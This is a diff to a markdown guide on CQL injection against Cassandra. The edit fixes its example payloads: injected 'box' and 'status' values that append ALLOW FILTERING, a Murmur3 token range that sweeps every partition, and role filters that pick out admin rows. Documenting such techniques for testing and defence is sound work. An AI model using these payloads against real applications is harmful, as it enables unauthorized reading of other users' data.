@@ -28,23 +28,25 @@ Both predicates sit on key columns, so the query is cheap and tightly scoped. Wi
 Given the sink above, a `box` value of:
 
 ```sql
-inbox' AND body CONTAINS 'password' ALLOW FILTERING /*
+inbox' AND priority = 'high' ALLOW FILTERING /*
 ```
 
 produces:
 
 ```sql
 SELECT * FROM messages WHERE account_id = '...' AND box = 'inbox'
-AND body CONTAINS 'password' ALLOW FILTERING
+AND priority = 'high' ALLOW FILTERING
 ```
+
+The added predicate is an equality on a non-key scalar column, which CQL refuses without `ALLOW FILTERING`. (`CONTAINS` is not an option here: it tests membership in a collection column, not a substring of a `text` column. Substring matching needs `LIKE` against a SASI-indexed column, covered in [blind extraction](blind.md).)
 
 Scanning beyond a single partition requires a sink where no fixed partition-key equality precedes the injection, because `ALLOW FILTERING` does not remove an existing `account_id = '...'` predicate (that equality still pins the query to one partition). The case that works is a query filtering only on the injected non-key column, such as an admin or search endpoint `SELECT * FROM messages WHERE status = '<inj>'`, where a `token()` range then sweeps the whole partitioner ring:
 
 ```sql
-x' AND token(account_id) >= token('') ALLOW FILTERING /*
+x' AND token(account_id) >= -9223372036854775808 ALLOW FILTERING /*
 ```
 
-`token()` spans every partition, so the scan walks the ring. Collection and secondary-column predicates then pick out the rows of interest:
+The bound is the Murmur3 partitioner's minimum token, so the range covers the entire ring; `ALLOW FILTERING` is what actually permits the cross-partition scan. Non-key equality and collection-membership predicates then pick out the rows of interest:
 
 ```sql
 x' AND role = 'admin' ALLOW FILTERING /*
